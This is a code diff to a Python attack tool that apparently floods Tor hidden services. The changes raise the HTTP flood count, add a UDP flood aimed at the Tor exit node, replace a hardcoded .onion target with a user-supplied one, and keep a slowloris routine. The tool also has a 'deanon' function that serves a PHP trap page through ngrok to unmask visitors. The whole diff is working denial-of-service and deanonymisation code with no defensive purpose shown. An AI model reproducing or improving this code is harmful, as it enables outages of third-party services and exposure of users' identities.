@@ -92,7 +92,7 @@ def attack1(host, port):
              "Referer: %s\r\n"
              "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\r\n\r\n" %
              (host, random.choice(useragents), random.choice(referers) + str(randstr)))
-      for i in range(0, 99):
+      for i in range(0, 399):
         s.send(randstr)
     except:
         print('  Error1')
@@ -114,10 +114,9 @@ def attack2(host1, port):
 
 def attack3(host, port):
   try:
-    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
-    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, 80))
-    s.send(randstr)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+    s.sendto(bytes, (host, port))
   except:
     print(' Error3')
 
@@ -148,7 +147,7 @@ def wordpress(host, count):
 def init_socket(target1):
   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
   s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect(('2gzxfta4w657xuz7.onion',80))
+  s.connect((target1, 80))
   s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
   for header in regular_headers:
     s.send('{}\r\n'.format(header).encode('UTF-8'))
@@ -180,9 +179,9 @@ def slowloris(target1, count):
 def deanon():
   site = 'php/index.php'
   api = 'http://localhost:4040/api/tunnels'
-  print('\n' + '[!]' + ' Starting Apache Server...')
+  print('\n' + Fore.GREEN + '  [+]' + Fore.WHITE + ' Starting Apache Server...')
   subp.check_output(['service', 'apache2', 'start'])
-  print('\n' + '[+]' + ' Starting Ngrok...' + '\n')
+  print('\n' + Fore.GREEN + '  [+]' + Fore.WHITE + ' Starting Ngrok...' + '\n')
   subp.Popen(['ngrok', 'http', '80'], stdin=subp.PIPE,stderr=subp.PIPE, stdout=subp.PIPE)
   time.sleep(10)
   r1 = requests.get(api)
@@ -190,7 +189,7 @@ def deanon():
   json1 = json.loads(page)
   for item in json1['tunnels']:
     if item['proto'] == 'https':
-      print('[+]' +' Trap URL: '+ item['public_url'] + '/' + site + '/')
+      print(Fore.GREEN + '  [+]' + Fore.WHITE + ' Trap URL: '+ item['public_url'] + '/' + site + '\n')
 
 
 def checkdirec(direc):
@@ -296,8 +295,8 @@ exitnode = re.findall(r'<ip>(.*?)</ip>', data, re.DOTALL)
 
 exitnode = ''.join(exitnode)
 
-print(Fore.GREEN + '  Server: ' + responce.headers.get('Server'))
-print(Fore.GREEN + '  Exit node: ' +  exitnode + '\n')
+print(Fore.GREEN + '  [+] ' + Fore.WHITE + 'Server: ' + responce.headers.get('Server'))
+print(Fore.GREEN + '  [+] ' + Fore.WHITE + 'Exit node: ' + exitnode + '\n')
 
 if(attack == '1'):
   data = requests.get('http://pastebin.com/raw/QwjrgKj2', headers=headers, proxies=proxies).text
@@ -344,7 +343,7 @@ threads = []
 for n in range(int(thread)):
     t1 = threading.Thread(target=attack1, args=(target1, 9050))
     t2 = threading.Thread(target=attack2, args=(target, 9050))
-    t3 = threading.Thread(target=attack3, args=(target1, 9050))
+    t3 = threading.Thread(target=attack3, args=(exitnode, 80))
 
     t1.daemon = True
     t2.daemon = True
